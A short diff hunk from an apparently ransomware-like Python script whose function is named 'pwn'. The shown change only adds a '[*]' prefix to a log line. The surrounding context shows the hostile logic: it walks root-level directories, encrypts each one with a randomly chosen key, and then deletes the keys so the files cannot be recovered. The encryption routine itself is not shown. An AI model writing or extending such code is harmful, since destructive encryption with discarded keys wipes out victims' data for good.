@@ -126,7 +126,7 @@ def pwn():
     print "beginning crypto operations"
     for dir in sorted(dirs):
         directory = '/%s' % dir
-        print "Encrypting {}".format(directory)
+        print "[*] Encrypting {}".format(directory)
         encrypt_dir(directory, key=SystemRandom().choice(keys))
     keys = None
     del keys
